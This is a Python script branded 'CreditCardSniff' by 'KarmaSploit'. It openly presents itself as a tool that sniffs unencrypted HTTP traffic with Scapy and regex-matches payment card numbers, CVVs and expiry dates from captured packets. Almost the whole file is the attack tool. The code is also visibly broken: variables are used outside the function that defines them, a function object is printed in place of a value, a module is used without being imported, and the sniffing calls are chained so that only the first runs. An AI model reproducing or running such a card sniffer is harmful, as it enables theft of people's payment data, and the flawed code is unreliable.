
#!/usr/bin/env python3
#karmasploit
import sys
from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)
try:
	from scapy.all import *
	#from scapy_ssl_tls.ssl_tls import *
except ImportError:
	print(f"{RED}{BRIGHT}Error!!: Please install Scapy")
	sys.exit(1)
try:
	import re
except ImportError:
	print(f"{RED}{BRIGHT}Error!!: Please install re")
	sys.exit(1)
try:
	import colorama
	from colorama import Fore, Style, Back
except ImportError:
	print(f"{RED}{BRIGHT}Error!!: Please install colorama")
	sys.exit(1)
try:

	import pyfiglet
except ImportError:
	print(f"{RED}{BRIGHT}Error!!: Please install pyfiglet")
	sys.exit(1)

from subprocess import call
import os
from time import ctime, sleep
from sys import platform, exit
import requests
import datetime

######################################################
            # make this look decent                  #
banner = pyfiglet.figlet_format("CreditCardSniff")   #
RED = Fore.RED                                       #
GREEN = Fore.GREEN                                   #
YELLOW = Fore.YELLOW                                 #
BRIGHT = Style.BRIGHT                                #
colorama.init(autoreset=True)                        #
######################################################

#####################################################
                    # PCAP Generator
#####################################################
def OSCheck():
	print(f"{YELLOW}{BRIGHT}[*] Detecting your OS please wait.....")
	time.sleep(5)
	if platform == "linux":
		print(f"{GREEN}{BRIGHT}[+] Currently running Linux!")
	else:
		print(f"{RED}{BRIGHT}[-] This Version is Linux only")
		exit(0)

def CreditCard(pkt):
	raw = pkt.sprintf('%Raw.load%')
	americaRE = re.findall("3[47][0-9]{13}", raw)
	masterRE = re.findall("5[1-5][0-9]{14}$", raw)
	visaRE = re.findall("4[0-9]{12} (?:[0-9]{3})?$", raw)
	discoverRE = re.findall("6(?:011|5[0-9]{2})[0-9]{12}$", raw)
def CVV(pkt):
	raw = pkt.sprintf('%Raw.load%')
	CCVRE = re.findall("((^[0-9]){3}$)", raw)
def MMYY(pkt):
	raw = pkt.sprintf('%Raw.load%')
	MMYY = re.findall(r"(?:0[1-9]|1[0-2])/[0-9]{2}$", raw)

	if americaRE:
		print("[+] Found American Express Card: " + str(americaRE) +''+ str(CVV) +'' + str(MMYY))
	if masterRE:
		print(f"{GREEN}{BRIGHT}[+] Found MasterCard Card: "+ str(masterRE) +''+ str(CVV) +''+ str(MMYY))
	if visaRE:
		print(f"{GREEN}{BRIGHT}[+] Found Visa Card: " + str(visaRE) +''+ str(CVV) +'' + str(MMYY))
	if discoverRE:
		print(f"{GREEN}{BRIGHT}[+] Found Discover Card: " + str(discoverRE) +''+ str(CVV) +'' + str(MMYY))
def linkscc():
	os.system('gnome-terminal -- python3 linkscc.py')
def connection(url='https://www.google.com', timeout=5):
	try:
		test = requests.get(url, timeout=timeout)
		return True
	except requests.ConnectionError:
		print(f"{RED}{BRIGHT}Please Connect to the Internet")
		time.sleep(3)
		exit(1)
	return False
def main():
	call('clear')
	print(banner)
	print(Fore.RED + Style.BRIGHT + "   }--{+}  Coded By KarmaSploit {+}--{")
	print(Fore.RED + Style.BRIGHT + "}----{+}  Instagram: KarmaSploit {+}----{")
	print(Fore.RED + Style.BRIGHT + "   }--{+}     Version: 2.5     {+}--{")
	connection()
	OSCheck()
	time.sleep(5)
	call('clear')
	print(banner)
	interface  = input("Enter interface: ")
	linkscc()
	if interface == None:
		print(f"{RED}{BRIGHT}Please Specify Interface")
		exit(0)
	else:
		conf.iface = interface
	try:
		print("[*] Starting Credit Card Sniffer on %s" % (interface))
		sniff(iface=interface, filter="tcp port 80", prn=CreditCard, store=0)
		sniff(iface=interface, filter="tcp port 80", prn=CVV, store=0)
		sniff(iface=interface, filter="tcp port 80", prn=MMYY, store=0)
	except KeyboardInterrupt:
		exit(0)
		call('clear')
if __name__ == "__main__":
	main()
